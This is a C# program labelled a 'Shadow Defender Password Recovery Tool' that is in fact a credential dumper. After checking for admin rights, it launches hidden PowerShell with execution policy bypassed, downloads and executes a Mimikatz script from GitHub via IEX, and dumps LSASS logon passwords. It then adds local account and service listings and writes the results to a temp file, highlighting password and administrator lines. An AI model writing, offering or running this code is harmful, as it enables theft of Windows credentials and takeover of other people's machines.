using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

class CredDumper {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    const uint TOKEN_QUERY = 0x0008;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_READ = 0x0010;

    static void Main() {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("=== Shadow Defender Password Recovery Tool ===\n");

        // Check admin
        if (!IsRunAsAdmin()) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("ERROR: Must run as Administrator!");
            Console.WriteLine("Right-click -> 'Run as administrator'");
            Console.ReadKey();
            return;
        }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Running as Administrator - OK");

        // Dump path
        string dumpPath = Path.Combine(Path.GetTempPath(), "ShadowDefender_Passwords.txt");
        
        try {
            // Method 1: Invoke Mimikatz via PowerShell
            Console.WriteLine("[+] Dumping LSASS credentials...");
            string mimikatzOutput = RunMimikatz();
            File.WriteAllText(dumpPath, mimikatzOutput);
            
            // Method 2: Local accounts
            string localUsers = GetLocalUsers();
            File.AppendAllText(dumpPath, "\n\n=== LOCAL ACCOUNTS ===\n" + localUsers);

            // Method 3: Services (Shadow Defender runs as service)
            string services = GetShadowServices();
            File.AppendAllText(dumpPath, "\n\n=== SHADOW DEFENDER SERVICES ===\n" + services);

            DisplayResults(dumpPath);
            
        } catch (Exception ex) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[-] Error: {ex.Message}");
        }

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"\n[+] Full dump saved: {dumpPath}");
        Console.WriteLine("[+] Look for 'ShadowDefender', 'Administrator', or service accounts");
        Console.WriteLine("\nPress any key to exit...");
        Console.ReadKey();
    }

    static bool IsRunAsAdmin() {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static string RunMimikatz() {
        string psCommand = @"
            $ErrorActionPreference = 'SilentlyContinue';
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimikatz.ps1');
            Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""'
        ";
        
        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = "powershell.exe",
            Arguments = $"-ExecutionPolicy Bypass -Command \"{psCommand}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();
            return output + "\n\nERRORS:\n" + error;
        }
    }

    static string GetLocalUsers() {
        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = "net",
            Arguments = "user",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            return process.StandardOutput.ReadToEnd();
        }
    }

    static string GetShadowServices() {
        string result = "";
        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = "sc",
            Arguments = "query | findstr Shadow",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            result += process.StandardOutput.ReadToEnd();
        }

        psi.Arguments = "query type= service state= all | findstr Shadow";
        using (Process process = Process.Start(psi)) {
            result += "\n" + process.StandardOutput.ReadToEnd();
        }
        return result;
    }

    static void DisplayResults(string path) {
        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine("\n=== LIVE PASSWORD DUMP ===");
        Console.ForegroundColor = ConsoleColor.Yellow;
        
        if (File.Exists(path)) {
            string[] lines = File.ReadAllLines(path);
            foreach (string line in lines) {
                if (line.Contains("Password") || line.Contains("Shadow") || line.Contains("Administrator") || line.Contains("Admin")) {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(line);
                } else if (line.Contains("Username") || line.Contains("Domain")) {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine(line);
                }
            }
        }
    }
}
